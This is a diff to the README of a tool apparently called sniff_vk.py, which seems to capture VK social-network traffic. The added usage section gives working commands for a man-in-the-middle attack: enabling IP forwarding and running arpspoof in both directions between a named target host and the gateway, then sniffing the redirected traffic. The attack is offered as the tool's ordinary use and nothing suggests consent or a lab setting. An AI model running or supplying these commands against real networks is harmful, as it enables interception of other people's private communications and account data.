@@ -1,9 +1,22 @@
 # Using
 
-Sniffing data on wlan0:
+Tested on MacOs X, with dsniff from macports.
+
+Start arp spoofing:
+
+Target - 192.168.2.151
+Gate - 192.168.2.1
 
 ```
-$ ./sniff_vk.py -i wlan0
+$ sudo sysctl -w net.inet.ip.forwarding=1
+$ sudo arpspoof -i en1 -t 192.168.2.151 192.168.2.1
+$ sudo arpspoof -i en1 -t 192.168.2.1 192.168.2.151
+```
+
+Sniffing data on en1:
+
+```
+$ ./sniff_vk.py -i en1
 ```
 
 Parsing pcap file:
